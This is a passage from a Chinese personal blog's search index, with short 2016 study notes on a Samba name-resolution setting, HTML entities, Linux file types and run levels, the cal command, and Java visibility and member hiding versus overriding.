<li>定位到[global] 然后在[global]下面添加<br>name resolve order = wins lmhosts bcast</li>
</ol>
<ol>
<li>保存退出 重启 即可</li>
</ol>
<p><a href="https://bbs.archlinux.org/viewtopic.php?id=207773" target="_blank" rel="external">ArchLinux的</a></p>
<p>不过我怎么感觉我都木有配smb。。。<br>这真实一个奇怪的问题<br>我还是再找找吧</p>
]]></content>
      
        
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 周五 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[mark下几个常用的HTML实体]]></title>
      <url>/2016/07/15/mark%E4%B8%8B%E5%87%A0%E4%B8%AA%E5%B8%B8%E7%94%A8%E7%9A%84HTML%E5%AE%9E%E4%BD%93/</url>
      <content type="html"><![CDATA[<table>
<thead>
<tr>
<th>HTML实体</th>
<th>字符</th>
</tr>
</thead>
<tbody>
<tr>
<td>&amp;quot;</td>
<td>“</td>
</tr>
<tr>
<td>&amp;apos;</td>
<td>‘</td>
</tr>
<tr>
<td>&amp;amp;</td>
<td>&amp;</td>
</tr>
<tr>
<td>&amp;lt;</td>
<td>&lt;</td>
</tr>
<tr>
<td>&amp;gt;</td>
<td>&gt;</td>
</tr>
</tbody>
</table>
<p>另外，任何字符都可以用他的ASCII码进行HTML编码</p>
<p>&amp;#34;  代表 “<br>&amp;#39;  代表 ‘</p>
<p>或者用他的16进制ASCII码(以x为前缀)<br>&amp;#x22; 代表 “<br>&amp;#x27; 代表 ‘</p>
]]></content>
      
        
        <tags>
            
            <tag> 周五 </tag>
            
            <tag> html </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[mark下Linux文件属性]]></title>
      <url>/2016/07/14/mark%E4%B8%8BLinux%E6%96%87%E4%BB%B6%E5%B1%9E%E6%80%A7/</url>
      <content type="html"><![CDATA[<p>在家里吃的第二顿午饭～</p>
<p>在家生活条件MAX</p>
<p>mark 下ls -al出现的</p>
<pre><code>drwxrwxr-x  3 haibin haibin 4096 7月  13 16:54 themes
</code></pre><p>的第一位</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>表示</th>
</tr>
</thead>
<tbody>
<tr>
<td> [d]</td>
<td>目录</td>
</tr>
<tr>
<td> [-]</td>
<td>文件</td>
</tr>
<tr>
<td> [l]</td>
<td>连接文件(linkfile)</td>
</tr>
<tr>
<td> [b]</td>
<td>设备文件中的<em>可供储存</em>的接口设备</td>
</tr>
<tr>
<td> [c]</td>
<td>设备文件中的<em>串行端口设备</em>，如鼠标键盘(一次性读取设备)</td>
</tr>
</tbody>
</table>
<p>另外，后面的是 w - 4, r -2, x - 1<br>而且对于目录而言,x 决定是否能进入该目录</p>
]]></content>
      
        
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 周四 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux Run Level]]></title>
      <url>/2016/07/13/Linux-Run-Level/</url>
      <content type="html"><![CDATA[<p>Run Level 0 : 关机<br>Run Level 1 : 单用户模式<br>Run Level 3 : 命令行<br>Run Level 5 : 图形界面<br>Run Level 6 : 重启</p>
<p>所以 init 0 也可以用来关机</p>
<p>惯用的关机 shutdown</p>
<p>还有的 reboot halt poweroff</p>
]]></content>
      
        
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 周三 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[mark下常用的几个命令]]></title>
      <url>/2016/07/13/mark%E4%B8%8B%E5%B8%B8%E7%94%A8%E7%9A%84%E5%87%A0%E4%B8%AA%E5%91%BD%E4%BB%A4/</url>
      <content type="html"><![CDATA[<ul>
<li><p>cal 显示日历</p>
<ul>
<li>cal 本月日历</li>
<li>cal 10 2016 本月日历</li>
<li>cal 2016 本年日历</li>
</ul>
</li>
<li><p>date 日期与时间</p>
</li>
</ul>
]]></content>
      
        
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 周三 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[java可见性修饰符]]></title>
      <url>/2016/07/13/java%E5%8F%AF%E8%A7%81%E6%80%A7%E4%BF%AE%E9%A5%B0%E7%AC%A6/</url>
      <content type="html"><![CDATA[<p>java的可见性修饰符与c++不太一样，尤其他的default是不同于public和pricate的</p>
<table>
<thead>
<tr>
<th>修饰符</th>
<th>可见性</th>
</tr>
</thead>
<tbody>
<tr>
<td>Private</td>
<td>无</td>
<td></td>
</tr>
<tr>
<td>None(default)</td>
<td>包中的类</td>
<td></td>
</tr>
<tr>
<td>Protect</td>
<td>包中的类，以及包中的(或者包外的)子类</td>
<td></td>
</tr>
<tr>
<td>Public</td>
<td>所有的类</td>
<td></td>
</tr>
</tbody>
</table>
]]></content>
      
        
        <tags>
            
            <tag> java </tag>
            
            <tag> 周三 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[java关于变量/方法覆盖]]></title>
      <url>/2016/07/13/java%E5%85%B3%E4%BA%8E%E5%8F%98%E9%87%8F-%E6%96%B9%E6%B3%95%E8%A6%86%E7%9B%96/</url>
      <content type="html"><![CDATA[<ol>
<li>先看<em>变量的覆盖(遮盖)</em></li>
</ol>
<pre class="line-numbers language-java"><code class="language-java">
<span class="token keyword">class</span> <span class="token class-name">InterCalculator</span> <span class="token punctuation">{</span>
    <span class="token keyword">int</span> sum<span class="token punctuation">;</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">DecimalCalculator</span> <span class="token keyword">extends</span> <span class="token class-name">InterCalculator</span> <span class="token punctuation">{</span>
    <span class="token keyword">double</span> sum<span class="token punctuation">;</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>当由一个派生层次更高的类型(父类)来引用一个子类对象，那么被遮蔽的对象会怎样呢</p>
<pre class="line-numbers language-java"><code class="language-java">DecimalCalculator dc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DecimalCalculator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
InterCalculator ic <span class="token operator">=</span> dc<span class="token punctuation">;</span>

<span class="token keyword">int</span> s <span class="token operator">=</span> ic<span class="token punctuation">.</span>num<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//access InterCalculator sum</span>

<span class="token comment" spellcheck="true">// 如果我们访问的对象使用到了InterCalculator类型的显示类型转换或者我们把一个实例传递给接受父类类型的方法，也会是这种情况</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ol>
<li>而类似的方法的覆盖,我一直叫 <em>方法的重写</em> (override)</li>
</ol>
<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Animal</span> <span class="token punctuation">{</span>
    <span class="token keyword">void</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token punctuation">}</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">Mammal</span> <span class="token keyword">extends</span> <span class="token class-name">Animal</span> <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// override the method sleep</span>
    <span class="token keyword">void</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token punctuation">}</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">Cat</span> <span class="token keyword">extends</span> <span class="token class-name">Mammal</span> <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// override the method sleep</span>
    <span class="token keyword">void</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>类似上面， 当由一个派生层次更高的类型(父类)来引用一个子类对象，那么被遮蔽的对象会怎样呢</p>
<pre class="line-numbers language-java"><code class="language-java">Cat simon <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Animal creature <span class="token operator">=</span> simon<span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
creature<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// access Cat sleep</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>方法的override与前面的变量的遮蔽不太一样</p>
<h3 id="从行为来看-Cat就是一个Cat，不管你怎么叫他-而其他时候creature更像一个Animal。要通过Animal引用访问一个被遮蔽的变量，则会找到Animal类的实现，而不是Cat。"><a href="#从行为来看-Cat就是一个Cat，不管你怎么叫他-而其他时候creature更像一个Animal。要通过Animal引用访问一个被遮蔽的变量，则会找到Animal类的实现，而不是Cat。" class="headerlink" title="从行为来看,Cat就是一个Cat，不管你怎么叫他,而其他时候creature更像一个Animal。要通过Animal引用访问一个被遮蔽的变量，则会找到Animal类的实现，而不是Cat。"></a>从行为来看,Cat就是一个Cat，不管你怎么叫他,而其他时候creature更像一个Animal。要通过Animal引用访问一个被遮蔽的变量，则会找到Animal类的实现，而不是Cat。</h3>]]></content>
      
        
        <tags>
            
            <tag> java </tag>
            
            <tag> 周三 </tag>
            
        </tags>
        
    </entry>
    
  
  
    
    <entry>
      <title><![CDATA[tags]]></title>
      <url>/tags/index.html</url>
      <content type="html"></content>
    </entry>
    
    <entry>
      <title><![CDATA[友链]]></title>
      <url>/links/index.html</url>
      <content type="html"></content>
    </entry>
    
  
</search>
